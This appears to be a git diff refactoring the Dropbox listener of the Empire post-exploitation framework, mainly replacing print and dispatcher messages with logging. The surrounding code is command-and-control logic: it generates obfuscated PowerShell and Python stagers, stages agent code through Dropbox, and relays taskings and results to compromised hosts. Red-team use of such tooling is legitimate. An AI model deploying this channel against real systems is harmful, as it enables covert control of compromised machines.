@@ -1,32 +1,43 @@
-from __future__ import print_function
-
 import base64
 import copy
-import json
+import logging
 import os
 import time
 from builtins import object, str
 from textwrap import dedent
-from typing import List
+from typing import List, Optional, Tuple
 
 import dropbox
-from pydispatch import dispatcher
 
 from empire.server.common import encryption, helpers, templating
-from empire.server.database import models
-from empire.server.database.base import Session
-from empire.server.utils import data_util, listener_util
+from empire.server.common.empire import MainMenu
+from empire.server.core.db import models
+from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util, listener_util, log_util
+from empire.server.utils.module_util import handle_validate_message
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
+    def __init__(self, mainMenu: MainMenu, params=[]):
 
         self.info = {
             "Name": "Dropbox",
-            "Author": ["@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                }
+            ],
             "Description": ("Starts a Dropbox listener."),
             "Category": ("third_party"),
             "Comments": [],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -126,13 +137,15 @@ class Listener(object):
             data_util.get_config("staging_key")[0]
         )
 
+        self.instance_log = log
+
     def default_response(self):
         """
         Returns a default HTTP server page.
         """
         return ""
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
         Validate all options for this listener.
         """
@@ -146,16 +159,15 @@ class Listener(object):
             if self.options[key]["Required"] and (
                 str(self.options[key]["Value"]).strip() == ""
             ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return False
+                handle_validate_message(f'[!] Option "{key}" is required.')
 
-        return True
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -171,22 +183,19 @@ class Listener(object):
         bypasses = [] if bypasses is None else bypasses
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_launcher(): no language specified!"
-                )
-            )
+            log.error("listeners/dbx generate_launcher(): no language specified!")
+            return None
 
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
         if (
-            listenerName
-            and (listenerName in self.threads)
-            and (listenerName in self.mainMenu.listeners.activeListeners)
-        ):
-
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
             # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            listenerOptions = active_listener.options
+
             # host = listenerOptions['Host']['Value']
             staging_key = listenerOptions["StagingKey"]["Value"]
             profile = listenerOptions["DefaultProfile"]["Value"]
@@ -290,14 +299,13 @@ class Listener(object):
                 stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
-                    stager = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    stager = self.mainMenu.obfuscationv2.obfuscate(
                         stager,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
                 # base64 encode the stager and return it
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
@@ -313,8 +321,8 @@ class Listener(object):
                     if safeChecks.lower() == "true":
                         launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print(helpers.color(p, color="red"))
+                    p = f"Error setting LittleSnitch in stager: {str(e)}"
+                    log.error(p)
 
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
@@ -377,13 +385,6 @@ class Listener(object):
                 else:
                     return launcherBase
 
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_launcher(): invalid listener name specification!"
-                )
-            )
-
     def generate_stager(
         self, listenerOptions, encode=False, encrypt=True, language=None
     ):
@@ -392,11 +393,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_stager(): no language specified!"
-                )
-            )
+            log.error("listeners/dbx generate_stager(): no language specified!")
             return None
 
         pollInterval = listenerOptions["PollInterval"]["Value"]
@@ -490,10 +487,8 @@ class Listener(object):
                 return stager
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_agent(
@@ -501,7 +496,7 @@ class Listener(object):
         listenerOptions,
         language=None,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         version="",
     ):
         """
@@ -509,11 +504,7 @@ class Listener(object):
         """
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_agent(): no language specified!"
-                )
-            )
+            log.error("listeners/dbx generate_agent(): no language specified!")
             return None
 
         language = language.lower()
@@ -592,10 +583,8 @@ class Listener(object):
 
             return code
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_comms(self, listenerOptions, language=None):
@@ -660,17 +649,11 @@ class Listener(object):
                 return comms
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                    )
+                log.error(
+                    "listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/dbx generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/dbx generate_comms(): no language specified!")
 
     def start_server(self, listenerOptions):
         """
@@ -721,6 +704,9 @@ class Listener(object):
                                                                                         <- delete /Empire/results/sessionID.txt
 
         """
+        self.instance_log = log_util.get_listener_logger(
+            LOG_NAME_PREFIX, self.options["Name"]["Value"]
+        )
 
         def download_file(dbx, path):
             # helper to download a file at the given path
@@ -728,11 +714,10 @@ class Listener(object):
                 md, res = dbx.files_download(path)
             except dropbox.exceptions.HttpError as err:
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] Error downloading data from '{}' : {}".format(path, err)
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/dropbox/{}".format(listenerName)
+                message = (
+                    f"{listenerName}: Error downloading data from '{path}' : {err}"
                 )
+                self.instance_log.error(message, exc_info=True)
 
                 return None
             return res.content
@@ -743,11 +728,8 @@ class Listener(object):
                 dbx.files_upload(data, path)
             except dropbox.exceptions.ApiError:
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] Error uploading data to '{}'".format(path)
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/dropbox/{}".format(listenerName)
-                )
+                message = f"{listenerName}: Error uploading data to '{path}'"
+                self.instance_log.error(message, exc_info=True)
 
         def delete_file(dbx, path):
             # helper to delete a file at the given path
@@ -755,11 +737,8 @@ class Listener(object):
                 dbx.files_delete(path)
             except dropbox.exceptions.ApiError:
                 listenerName = self.options["Name"]["Value"]
-                message = "[!] Error deleting data at '{}'".format(path)
-                signal = json.dumps({"print": True, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/dropbox/{}".format(listenerName)
-                )
+                message = f"{listenerName} Error deleting data at '{path}'"
+                self.instance_log.error(message, exc_info=True)
 
         # make a copy of the currently set listener options for later stager/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
@@ -788,10 +767,9 @@ class Listener(object):
         try:
             dbx.users_get_current_account()
         except dropbox.exceptions.AuthError as err:
-            print(
-                helpers.color(
-                    "[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web."
-                )
+            log.error(
+                "ERROR: Invalid access token; try re-generating an access token from the app console on the web.",
+                exc_info=True,
             )
             return False
 
@@ -800,23 +778,22 @@ class Listener(object):
             dbx.files_create_folder(stagingFolder)
         except dropbox.exceptions.ApiError:
             listenerName = self.options["Name"]["Value"]
-            message = "[*] Dropbox folder '{}' already exists".format(stagingFolder)
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+            message = f"{listenerName}: Dropbox folder '{stagingFolder}' already exists"
+            self.instance_log.info(message)
         try:
             dbx.files_create_folder(taskingsFolder)
         except dropbox.exceptions.ApiError:
             listenerName = self.options["Name"]["Value"]
-            message = "[*] Dropbox folder '{}' already exists".format(taskingsFolder)
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+            message = (
+                f"{listenerName}: Dropbox folder '{taskingsFolder}' already exists"
+            )
+            self.instance_log.info(message)
         try:
             dbx.files_create_folder(resultsFolder)
         except dropbox.exceptions.ApiError:
             listenerName = self.options["Name"]["Value"]
-            message = "[*] Dropbox folder '{}' already exists".format(resultsFolder)
-            signal = json.dumps({"print": False, "message": message})
-            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+            message = f"{listenerName}: Dropbox folder '{resultsFolder}' already exists"
+            self.instance_log.info(message)
 
         # upload the stager.ps1 code
         stagerCodeps = self.generate_stager(
@@ -832,11 +809,10 @@ class Listener(object):
             dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
             dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
         except dropbox.exceptions.ApiError:
-            print(
-                helpers.color(
-                    "[!] Error uploading stager to '%s/stager'" % (stagingFolder)
-                )
+            message = (
+                f"{listenerName}: Error uploading stager to '{stagingFolder}/stager'"
             )
+            self.instance_log.error(message, exc_info=True)
             return
 
         while True:
@@ -856,16 +832,8 @@ class Listener(object):
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
                             listenerName = self.options["Name"]["Value"]
-                            message = (
-                                "[!] Error downloading data from '{}' : {}".format(
-                                    fileName, err
-                                )
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/dropbox/{}".format(listenerName),
-                            )
+                            message = f"{listenerName}: Error downloading data from '{fileName}' : {err}"
+                            self.instance_log.error(message, exc_info=True)
                             continue
                         stageData = res.content
 
@@ -879,67 +847,31 @@ class Listener(object):
                                     dbx.files_delete(fileName)
                                 except dropbox.exceptions.ApiError:
                                     listenerName = self.options["Name"]["Value"]
-                                    message = "[!] Error deleting data at '{}'".format(
-                                        fileName
-                                    )
-                                    signal = json.dumps(
-                                        {"print": True, "message": message}
-                                    )
-                                    dispatcher.send(
-                                        signal,
-                                        sender="listeners/dropbox/{}".format(
-                                            listenerName
-                                        ),
-                                    )
+                                    message = f"{listenerName}: Error deleting data at '{fileName}'"
+                                    self.instance_log.error(message, exc_info=True)
                                 try:
                                     stageName = "%s/%s_2.txt" % (
                                         stagingFolder,
                                         sessionID,
                                     )
                                     listenerName = self.options["Name"]["Value"]
-                                    message = "[*] Uploading key negotiation part 2 to {} for {}".format(
-                                        stageName, sessionID
-                                    )
-                                    signal = json.dumps(
-                                        {"print": True, "message": message}
-                                    )
-                                    dispatcher.send(
-                                        signal,
-                                        sender="listeners/dropbox/{}".format(
-                                            listenerName
-                                        ),
-                                    )
+                                    message = f"Uploading key negotiation part 2 to {stageName} for {sessionID}"
+                                    self.instance_log.info(message)
+                                    log.info(message)
+
                                     dbx.files_upload(results, stageName)
                                 except dropbox.exceptions.ApiError:
                                     listenerName = self.options["Name"]["Value"]
-                                    message = "[!] Error uploading data to '{}'".format(
-                                        stageName
-                                    )
-                                    signal = json.dumps(
-                                        {"print": True, "message": message}
-                                    )
-                                    dispatcher.send(
-                                        signal,
-                                        sender="listeners/dropbox/{}".format(
-                                            listenerName
-                                        ),
-                                    )
+                                    message = f"{listenerName}: Error uploading data to '{stageName}'"
+                                    self.instance_log.error(message, exc_info=True)
 
                     if stage == "3":
                         try:
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
                             listenerName = self.options["Name"]["Value"]
-                            message = (
-                                "[!] Error downloading data from '{}' : {}".format(
-                                    fileName, err
-                                )
-                            )
-                            signal = json.dumps({"print": True, "message": message})
-                            dispatcher.send(
-                                signal,
-                                sender="listeners/dropbox/{}".format(listenerName),
-                            )
+                            message = f"{listenerName}: Error downloading data from '{fileName}' : {err}"
+                            self.instance_log.error(message, exc_info=True)
                             continue
                         stageData = res.content
 
@@ -954,37 +886,16 @@ class Listener(object):
                                         "sessionKey"
                                     ]
                                     listenerName = self.options["Name"]["Value"]
-                                    message = "[*] Sending agent (stage 2) to {} through Dropbox".format(
-                                        sessionID
-                                    )
-                                    signal = json.dumps(
-                                        {"print": True, "message": message}
-                                    )
-                                    dispatcher.send(
-                                        signal,
-                                        sender="listeners/dropbox/{}".format(
-                                            listenerName
-                                        ),
-                                    )
+                                    message = f"{listenerName}: Sending agent (stage 2) to {sessionID} through Dropbox"
+                                    self.instance_log.info(message)
+                                    log.info(message)
 
                                     try:
                                         dbx.files_delete(fileName)
                                     except dropbox.exceptions.ApiError:
                                         listenerName = self.options["Name"]["Value"]
-                                        message = (
-                                            "[!] Error deleting data at '{}'".format(
-                                                fileName
-                                            )
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/dropbox/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Error deleting data at '{fileName}'"
+                                        self.instance_log.error(message, exc_info=True)
 
                                     try:
                                         fileName2 = fileName.replace(
@@ -994,23 +905,11 @@ class Listener(object):
                                         dbx.files_delete(fileName2)
                                     except dropbox.exceptions.ApiError:
                                         listenerName = self.options["Name"]["Value"]
-                                        message = (
-                                            "[!] Error deleting data at '{}'".format(
-                                                fileName2
-                                            )
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/dropbox/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Error deleting data at '{fileName2}'"
+                                        self.instance_log.error(message, exc_info=True)
 
                                     session_info = (
-                                        Session()
+                                        SessionLocal()
                                         .query(models.Agent)
                                         .filter(models.Agent.session_id == sessionID)
                                         .first()
@@ -1026,45 +925,25 @@ class Listener(object):
                                         listenerOptions=listenerOptions,
                                         version=version,
                                     )
+
+                                    if language.lower() in ["python", "ironpython"]:
+                                        sessionKey = bytes.fromhex(sessionKey)
+
                                     returnResults = encryption.aes_encrypt_then_hmac(
                                         sessionKey, agentCode
                                     )
 
                                     try:
-                                        stageName = "%s/%s_4.txt" % (
-                                            stagingFolder,
-                                            sessionID,
-                                        )
+                                        stageName = f"{stagingFolder}/{sessionID}_4.txt"
                                         listenerName = self.options["Name"]["Value"]
-                                        message = "[*] Uploading key negotiation part 4 (agent) to {} for {}".format(
-                                            stageName, sessionID
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/dropbox/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Uploading key negotiation part 4 (agent) to {stageName} for {sessionID}"
+                                        self.instance_log.info(message)
+                                        log.info(message)
                                         dbx.files_upload(returnResults, stageName)
                                     except dropbox.exceptions.ApiError:
                                         listenerName = self.options["Name"]["Value"]
-                                        message = (
-                                            "[!] Error uploading data to '{}'".format(
-                                                stageName
-                                            )
-                                        )
-                                        signal = json.dumps(
-                                            {"print": True, "message": message}
-                                        )
-                                        dispatcher.send(
-                                            signal,
-                                            sender="listeners/dropbox/{}".format(
-                                                listenerName
-                                            ),
-                                        )
+                                        message = f"{listenerName}: Error uploading data to '{stageName}'"
+                                        self.instance_log.error(message, exc_info=True)
 
             # get any taskings applicable for agents linked to this listener
             sessionIDs = self.mainMenu.agents.get_agents_for_listener(listenerName)
@@ -1092,13 +971,8 @@ class Listener(object):
                             taskingData = taskingData + existingData
 
                         listenerName = self.options["Name"]["Value"]
-                        message = "[*] Uploading agent tasks for {} to {}".format(
-                            sessionID, taskingFile
-                        )
-                        signal = json.dumps({"print": False, "message": message})
-                        dispatcher.send(
-                            signal, sender="listeners/dropbox/{}".format(listenerName)
-                        )
+                        message = f"{listenerName}: Uploading agent tasks for {sessionID} to {taskingFile}"
+                        self.instance_log.info(message)
 
                         dbx.files_upload(
                             taskingData,
@@ -1107,15 +981,9 @@ class Listener(object):
                         )
                     except dropbox.exceptions.ApiError as e:
                         listenerName = self.options["Name"]["Value"]
-                        message = (
-                            "[!] Error uploading agent tasks for {} to {} : {}".format(
-                                sessionID, taskingFile, e
-                            )
-                        )
-                        signal = json.dumps({"print": True, "message": message})
-                        dispatcher.send(
-                            signal, sender="listeners/dropbox/{}".format(listenerName)
-                        )
+                        message = f"{listenerName} Error uploading agent tasks for {sessionID} to {taskingFile} : {e}"
+                        self.instance_log.error(message, exc_info=True)
+                        log.error(message, exc_info=True)
 
             # check for any results returned
             for match in dbx.files_search(resultsFolder, "*.txt").matches:
@@ -1123,25 +991,20 @@ class Listener(object):
                 sessionID = fileName.split("/")[-1][:-4]
 
                 listenerName = self.options["Name"]["Value"]
-                message = "[*] Downloading data for '{}' from {}".format(
-                    sessionID, fileName
+                message = (
+                    f"{listenerName} Downloading data for '{sessionID}' from {fileName}"
                 )
-                signal = json.dumps({"print": False, "message": message})
-                dispatcher.send(
-                    signal, sender="listeners/dropbox/{}".format(listenerName)
-                )
+                self.instance_log.info(message)
 
                 try:
                     md, res = dbx.files_download(fileName)
                 except dropbox.exceptions.HttpError as err:
                     listenerName = self.options["Name"]["Value"]
-                    message = "[!] Error download data from '{}' : {}".format(
-                        fileName, err
+                    message = (
+                        f"{listenerName}: Error download data from '{fileName}' : {err}"
                     )
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal, sender="listeners/dropbox/{}".format(listenerName)
-                    )
+                    self.instance_log.error(message, exc_info=True)
+                    log.error(message, exc_info=True)
                     continue
 
                 responseData = res.content
@@ -1150,11 +1013,9 @@ class Listener(object):
                     dbx.files_delete(fileName)
                 except dropbox.exceptions.ApiError:
                     listenerName = self.options["Name"]["Value"]
-                    message = "[!] Error deleting data at '{}'".format(fileName)
-                    signal = json.dumps({"print": True, "message": message})
-                    dispatcher.send(
-                        signal, sender="listeners/dropbox/{}".format(listenerName)
-                    )
+                    message = f"{listenerName} Error deleting data at '{fileName}'"
+                    self.instance_log.error(message, exc_info=True)
+                    log.error(message, exc_info=True)
 
                 self.mainMenu.agents.handle_agent_data(
                     stagingKey, responseData, listenerOptions
@@ -1189,14 +1050,11 @@ class Listener(object):
         Terminates the server thread stored in the self.threads dictionary,
         keyed by the listener name.
         """
-
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
-            self.threads[name].kill()
+            to_kill = name
         else:
-            print(
-                helpers.color(
-                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
-                )
-            )
-            self.threads[self.options["Name"]["Value"]].kill()
+            to_kill = self.options["Name"]["Value"]
+
+        self.instance_log.info(f"{to_kill}: shutting down...")
+        log.info(f"{to_kill}: shutting down...")
+        self.threads[to_kill].kill()
